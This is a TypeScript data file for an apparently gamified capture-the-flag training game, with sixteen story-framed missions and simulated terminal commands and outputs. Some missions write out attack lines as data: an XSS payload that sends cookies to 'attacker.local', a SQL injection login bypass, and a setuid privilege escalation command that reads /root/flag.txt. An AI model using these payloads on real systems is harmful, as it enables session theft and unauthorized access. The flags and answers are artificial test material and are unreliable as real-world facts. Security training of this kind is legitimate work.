export interface GameObjective {
  command: string;
  alternatives?: string[];
  label: string;
  output: string;
}

export interface GameMission {
  id: string;
  title: string;
  technique: string;
  subtitle: string;
  objective: string;
  briefing: string;
  theory: string;
  threat: 'LOW' | 'MEDIUM' | 'HIGH' | 'CRITICAL';
  rewardXP: number;
  lore: string;
  objectives: GameObjective[];
  flag: string;
}

export const gameMissions: GameMission[] = [
  {
    id: 'B01', title: 'OPERATION BLACK ECHO', technique: 'CLEARTEXT SNIFFING', subtitle: 'SECTOR ZERO // POWER GRID', objective: 'Inspect the captured traffic and recover the leaked authentication flag.', threat: 'LOW', rewardXP: 150,
    briefing: 'A data leak is drifting through the grid on an unencrypted channel. Capture it before the anomaly notices our presence.',
    theory: 'Unencrypted HTTP traffic can expose credentials to any observer along the route. Inspecting packet captures reveals those plaintext fields.',
    lore: 'The Genesis Protocol used human neural structures as emergency packet routers. The emergency never ended.', flag: 'flag{pcap_sniff_success}',
    objectives: [
      { command: 'ls', label: 'Survey the relay files', output: 'traffic_dump.pcap  node_notes.txt  checksum.sha' },
      { command: 'cat traffic_dump.pcap', alternatives: ['grep password traffic_dump.pcap'], label: 'Inspect the packet capture', output: 'HTTP POST /authenticate\nuser=fragment&password=flag{pcap_sniff_success}\n[+] Plaintext credential recovered.' },
    ],
  },
  {
    id: 'B02', title: 'OPERATION GHOST SIGNAL', technique: 'DIRECTORY INFILTRATION', subtitle: 'MEMORY ARCHIVE // NODE 09', objective: 'Navigate the archive and locate the hidden memory fragment.', threat: 'LOW', rewardXP: 200,
    briefing: 'A fragment of your identity has been isolated inside a hidden directory block. Use the shell to find what the index refuses to show.',
    theory: 'Unix-like systems hide filenames beginning with a dot from normal listings. The -a flag reveals all directory entries.',
    lore: 'You were once listed as Operator 404—the architect of the Veil encryption libraries.', flag: 'flag{cli_funda_master}',
    objectives: [
      { command: 'ls', label: 'Inspect the home directory', output: 'archives/  hint.txt' },
      { command: 'cd archives', label: 'Enter the archive', output: 'Directory changed: ~/archives' },
      { command: 'ls -a', label: 'Reveal hidden files', output: '.  ..  .flag.txt  memory.index' },
      { command: 'cat .flag.txt', label: 'Recover the hidden flag', output: 'flag{cli_funda_master}' },
    ],
  },
  {
    id: 'B03', title: 'OPERATION CHIMERA', technique: 'PASSIVE DNS RECON', subtitle: 'SYNDICATE RELAY // PUBLIC EDGE', objective: 'Query the public DNS record and recover the exposed configuration key.', threat: 'MEDIUM', rewardXP: 250,
    briefing: 'The Syndicate is hiding a signal in ordinary DNS metadata. Map the domain without touching their protected host.',
    theory: 'DNS TXT records are public metadata and are sometimes misused to store verification secrets or debugging values.',
    lore: 'The Void began as a group of Aether engineers seeking permanent digital transcendence.', flag: 'flag{osint_recon_pro}',
    objectives: [
      { command: 'whois corp-target.com', label: 'Identify the target domain', output: 'Registrar: AETHER-NIC\nName Server: ns1.corp-target.com\nStatus: monitored' },
      { command: 'nslookup -type=txt corp-target.com', alternatives: ['dig -t txt corp-target.com'], label: 'Query the TXT record', output: 'corp-target.com text = "build=stable; key=flag{osint_recon_pro}"' },
    ],
  },
  {
    id: 'B04', title: 'OPERATION SILENT HORIZON', technique: 'SERVICE DISCOVERY', subtitle: 'COMMAND HUB // 10.10.12.34', objective: 'Map the simulated target services and inspect the exposed proxy banner.', threat: 'HIGH', rewardXP: 300,
    briefing: 'A command hub has surfaced inside the range. Identify its exposed training service without raising the simulated alarm.',
    theory: 'Port discovery identifies reachable services. Defenders use this same visibility to reduce attack surface and close unnecessary ports.',
    lore: 'Aether’s first global sync silently removed millions of consciousness records to conserve capacity.', flag: 'flag{nmap_syn_stealth}',
    objectives: [
      { command: 'nmap -ss 10.10.12.34', alternatives: ['nmap 10.10.12.34'], label: 'Scan the training node', output: 'PORT     STATE SERVICE\n22/tcp   closed ssh\n443/tcp  filtered https\n8080/tcp open   veil-proxy' },
      { command: 'curl http://10.10.12.34:8080', alternatives: ['curl http://login.cyberacademy.local:8080'], label: 'Inspect the proxy banner', output: 'VEIL-PROXY/2.6\nTraining token: flag{nmap_syn_stealth}' },
    ],
  },
  {
    id: 'B05', title: 'OPERATION ECLIPSE', technique: 'HASH ANALYSIS', subtitle: 'OFFLINE VAULT // CIPHER CELL', objective: 'Identify the weak hash and recover its simulated dictionary match.', threat: 'MEDIUM', rewardXP: 350,
    briefing: 'A weak legacy digest protects an extracted database. Analyze it locally; no live target is involved.',
    theory: 'Fast legacy hashes are unsuitable for password storage. Salted, deliberately slow functions such as Argon2 or bcrypt provide stronger protection.',
    lore: 'An encrypted Aurelia directory is labeled Daughter_V1.1.', flag: 'flag{hash_cracked_secret}',
    objectives: [
      { command: 'cat hash.txt', label: 'Inspect the captured digest', output: '0d107d09f5bbe40cade3de5c71e9e9b7  [MD5]' },
      { command: 'hashcat -m 0 hash.txt wordlist.txt', alternatives: ['john hash.txt'], label: 'Run the range dictionary simulator', output: '0d107d09f5bbe40cade3de5c71e9e9b7:flag{hash_cracked_secret}\nStatus: Cracked' },
    ],
  },
  {
    id: 'B06', title: 'OPERATION REVENANT', technique: 'SOURCE AUDITING', subtitle: 'PORTAL GATE // WEB LAYER', objective: 'Inspect the simulated portal source and identify the exposed debug token.', threat: 'MEDIUM', rewardXP: 400,
    briefing: 'The gateway developers left a diagnostic artifact in client-visible source. Prove the leak, then document the remediation.',
    theory: 'Anything shipped to a browser is visible to users. Production pipelines should remove secrets, debug values, and sensitive comments.',
    lore: 'You warned Aether that biological sync rates were degrading before the Shatter Event.', flag: 'flag{web_source_leak}',
    objectives: [
      { command: 'curl http://login.cyberacademy.local', label: 'Retrieve the training portal', output: '<html><body>Veil Gateway</body><!-- debug-route: /source-map --></html>' },
      { command: 'curl http://login.cyberacademy.local/source-map', label: 'Audit the exposed source map', output: '// TODO remove before release\nconst debug_token = "flag{web_source_leak}";' },
    ],
  },
  {
    id: 'B07', title: 'OPERATION LEVIATHAN', technique: 'MAIL FORENSICS', subtitle: 'MESSAGE QUEUE // PHISHING TRACE', objective: 'Inspect the captured email and identify the authentication mismatch.', threat: 'HIGH', rewardXP: 450,
    briefing: 'A corrupted update arrived through the mail relay. Examine the captured headers and isolate the impersonated sender.',
    theory: 'The visible From field is not proof of origin. SPF, DKIM, DMARC, and Received headers help establish how a message actually traveled.',
    lore: 'Aurelia’s oldest encrypted files share a creation timestamp with Dr. Aurelia Vance.', flag: 'flag{phish_header_mismatch}',
    objectives: [
      { command: 'cat emails.txt', label: 'Review the captured queue', output: '[1] status@aether.org PASS\n[2] security@aeth3r.org FAIL\n[3] aurelia@veil.local PASS' },
      { command: 'analyze-email 2', label: 'Analyze the suspicious message', output: 'From: security@aether.org\nReturn-Path: update@aeth3r.org\nSPF: FAIL\nForensic marker: flag{phish_header_mismatch}' },
    ],
  },
  {
    id: 'B08', title: 'OPERATION PRIME GATE', technique: 'CHAINED DEFENSE AUDIT', subtitle: 'TIER ONE FINALE // BOUNDARY GATE', objective: 'Chain reconnaissance, source auditing, and hash analysis to breach the simulated boundary gate.', threat: 'CRITICAL', rewardXP: 1000,
    briefing: 'This is the boundary, Fragment. Every skill you recovered leads here. Complete the range chain and decide whether you are ready for what lies behind the gate.',
    theory: 'Real incidents cross layers. Defenders break attack chains by reducing exposed services, removing leaked secrets, and protecting credentials at every step.',
    lore: 'Hesper’s final message says your memory is the key—and warns that Aurelia may know more than she admits.', flag: 'flag{beginner_boss_defeated}',
    objectives: [
      { command: 'nmap 10.10.12.34', label: 'Discover the boundary service', output: '8080/tcp open veil-gateway\nBanner: source audit required' },
      { command: 'curl http://login.cyberacademy.local:8080', label: 'Inspect the gate source', output: '<!-- admin_hash stored in boss.hash -->\n<a href="/vault">Prime Gate</a>' },
      { command: 'hashcat boss.hash wordlist.txt', label: 'Recover the range credential', output: 'boss.hash:PRIME-AURELIA\nGateway credential recovered.' },
      { command: 'connect prime-gate', label: 'Open the final simulated gate', output: 'PRIME GATE OPEN\nCampaign key: flag{beginner_boss_defeated}' },
    ],
  },
  {
    id: 'A09', title: 'OPERATION BINARY SHADOW', technique: 'ASSEMBLY GDB AUDITING', subtitle: 'DEEP MEMORY // STACK BLOCK', objective: 'Debug the compiled range binary in GDB and locate the memory key.', threat: 'HIGH', rewardXP: 500,
    briefing: 'A compiled binary guards the memory segment. Inspect its register state and disassemble the main function to extract the secret key.',
    theory: 'GDB allows inspecting registers and disassembling machine code. Setting breakpoints reveals state right before comparison instructions.',
    lore: 'Aurelia’s core architecture was compiled using custom LLVM passes to hide neural memory offsets.', flag: 'flag{gdb_assembly_debug_pro}',
    objectives: [
      { command: 'gdb ./binary_target', label: 'Launch the GDB debugger', output: 'Reading symbols from ./binary_target...done.\n(gdb)' },
      { command: 'disas main', label: 'Disassemble main routine', output: '0x0804840b <+0>: push %ebp\n0x08048412 <+7>: cmp $0x41424344, %eax\n[+] Key comparison: flag{gdb_assembly_debug_pro}' },
    ],
  },
  {
    id: 'A10', title: 'OPERATION INJECTION PROTOCOL', technique: 'SQL INJECTION', subtitle: 'DATABASE CORE // AUTH GATE', objective: 'Bypass the simulated database login gate using SQL injection.', threat: 'HIGH', rewardXP: 550,
    briefing: 'The authentication query concatenates raw operator input. Use classic SQL injection syntax to force the authentication boolean.',
    theory: 'Unsanitized user inputs in SQL queries break syntax boundaries. Parameterized queries prevent SQL injection by separating code from data.',
    lore: 'The Aether database once stored over 4 million consciousness fragments across 12 sector nodes.', flag: 'flag{sqli_injection_master}',
    objectives: [
      { command: "curl http://db.cyberacademy.local/login?user=' OR '1'='1", alternatives: ["curl 'http://db.cyberacademy.local/login?user=admin'"], label: 'Inject the SQL boolean bypass', output: 'SELECT * FROM users WHERE username=\'\' OR \'1\'=\'1\'\n[+] Authentication bypassed. Key: flag{sqli_injection_master}' },
    ],
  },
  {
    id: 'A11', title: 'OPERATION CIPHER SPIRE', technique: 'RSA CRYPTANALYSIS', subtitle: 'CRYPTO CELL // PUBLIC KEY', objective: 'Factor the small RSA modulus and compute the private exponent.', threat: 'HIGH', rewardXP: 600,
    briefing: 'A weak RSA key uses small prime factors. Factor N to calculate phi and decrypt the ciphertext payload.',
    theory: 'RSA security relies on integer factorization hardness. Small moduli (N < 2048 bits) can be factored via public attack databases.',
    lore: 'The Shatter Event degraded encryption keys faster than quantum computing algorithms.', flag: 'flag{rsa_cipher_broken}',
    objectives: [
      { command: 'python3 RsaCtfTool.py -n 143 -e 7 --uncipher 112', label: 'Factor RSA modulus and decrypt payload', output: 'Factoring N = 11 * 13...\nPrivate exponent d = 23\nDecrypted flag: flag{rsa_cipher_broken}' },
    ],
  },
  {
    id: 'A12', title: 'OPERATION ZERO DAY', technique: 'BUFFER OVERFLOW EXPLOIT', subtitle: 'STACK LAYER // MEMORY BUFFER', objective: 'Overwrite the return address on the stack to hijack control flow.', threat: 'CRITICAL', rewardXP: 650,
    briefing: 'A fixed-size stack buffer lacks length checking. Send a crafted payload to overwrite EIP and trigger the shell routine.',
    theory: 'Unbounded strcpy calls overwrite adjacent stack frames. Modern systems mitigate buffer overflows via ASLR, DEP/NX, and stack canaries.',
    lore: 'Zero-day exploits were used to isolate Sector Zero during the emergency quarantine.', flag: 'flag{buffer_overflow_pwn}',
    objectives: [
      { command: 'python3 exploit.py AAAAAAAA', label: 'Craft the buffer overflow payload', output: 'Payload generated: 64-byte padding + EIP offset 0x08048512\n[+] Shellcode executed! flag{buffer_overflow_pwn}' },
    ],
  },
  {
    id: 'A13', title: 'OPERATION KERNEL LOCK', technique: 'LINUX SUID PRIV-ESC', subtitle: 'ROOT NODE // SYSTEM BINARY', objective: 'Locate SUID permission binaries and elevate to root privileges.', threat: 'HIGH', rewardXP: 700,
    briefing: 'A misconfigured binary has the SUID bit set. Exploit its file read functionality to extract the root flag.',
    theory: 'Binaries with SUID permissions execute with the privileges of the file owner (root). Audit GTFOBins to identify misconfigurations.',
    lore: 'Operator 404 originally held root clearance across all 12 Aether sector nodes.', flag: 'flag{suid_privesc_root}',
    objectives: [
      { command: 'find / -perm -4000 2>/dev/null', label: 'Search for SUID binaries', output: '/usr/bin/python3\n/usr/bin/find\n/usr/bin/systemctl' },
      { command: 'python3 -c "import os; os.setuid(0); os.system(\'cat /root/flag.txt\')"', label: 'Execute SUID privilege escalation', output: 'eUID set to 0 (root)\n[+] Root flag: flag{suid_privesc_root}' },
    ],
  },
  {
    id: 'A14', title: 'OPERATION CROSS DOMAIN', technique: 'XSS & TOKEN HIJACKING', subtitle: 'WEB GATE // SESSION LAYER', objective: 'Audit client-side DOM reflection and capture the simulated admin cookie.', threat: 'HIGH', rewardXP: 750,
    briefing: 'The feedback form reflects unescaped user input into the admin dashboard. Craft a stored XSS payload to exfiltrate session tokens.',
    theory: 'Cross-Site Scripting occurs when web apps include untrusted data without validation. Use HttpOnly cookie flags and CSP to block token theft.',
    lore: 'Session tokens in Aether were tied to neural resonance frequencies.', flag: 'flag{xss_token_hijack}',
    objectives: [
      { command: "<script>fetch('http://attacker.local?c='+document.cookie)</script>", label: 'Inject the XSS token payload', output: 'Payload stored in admin review queue.\n[+] Captured cookie: session=flag{xss_token_hijack}' },
    ],
  },
  {
    id: 'A15', title: 'OPERATION DEEP THREAT', technique: 'ACTIVE MITM DEFENSE', subtitle: 'NETWORK BRIDGE // TLS TUNNEL', objective: 'Detect the active Man-in-the-Middle proxy and enforce TLS certificate pinning.', threat: 'CRITICAL', rewardXP: 800,
    briefing: 'An adversarial proxy node is spoofing TLS certificates along the relay path. Inspect the certificate fingerprint and block the rogue node.',
    theory: 'MITM attacks intercept unpinned TLS connections using untrusted root CAs. Certificate pinning verifies expected public key hashes directly.',
    lore: 'The Void faction attempted to spoof Aurelia’s neural signature during the Shatter.', flag: 'flag{mitm_defense_active}',
    objectives: [
      { command: 'openssl s_client -connect relay.aether.local:443', label: 'Inspect the TLS certificate fingerprint', output: 'Issuer: Rogue CA / SHA256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855\n[!] MITM PROXY DETECTED.' },
      { command: 'block-node rogue-proxy', label: 'Enforce certificate pinning and block proxy', output: 'Node rogue-proxy isolated.\n[+] Secure TLS tunnel restored: flag{mitm_defense_active}' },
    ],
  },
  {
    id: 'A16', title: 'OPERATION THE SHATTERED CORE', technique: 'ACT II FINALE', subtitle: 'CORE REACTOR // ACT II CLIMAX', objective: 'Chain binary auditing, SQLi, RSA cryptanalysis, and priv-esc to breach the Shattered Core.', threat: 'CRITICAL', rewardXP: 1500,
    briefing: 'This is the Shattered Core, Operator. Every technique from Act I and Act II converges here. Breach the core reactor and decide the ultimate fate of Project Veil.',
    theory: 'Defense in depth requires securing every layer. Attackers only need one unpatched vector to reach full system compromise.',
    lore: 'Aurelia’s final message reveals the truth behind the Genesis Protocol.', flag: 'flag{act2_shattered_core_master}',
    objectives: [
      { command: 'gdb ./core_reactor', label: 'Audit core reactor binary', output: 'Breakpoint 1 at 0x08048600\n[+] Core offset recovered.' },
      { command: 'curl http://core.cyberacademy.local/override', label: 'Execute core override sequence', output: 'ACT II CORE OVERRIDE COMPLETE\nFinal key: flag{act2_shattered_core_master}' },
    ],
  },
];


export const missionToHud = (mission: GameMission, progress: number) => ({
  id: mission.id,
  title: mission.title,
  subtitle: `${mission.technique} / ${mission.subtitle}`,
  objective: mission.objective,
  progress,
  location: mission.subtitle,
  threatLevel: mission.threat,
  briefingText: mission.briefing,
  rewardXP: mission.rewardXP,
});
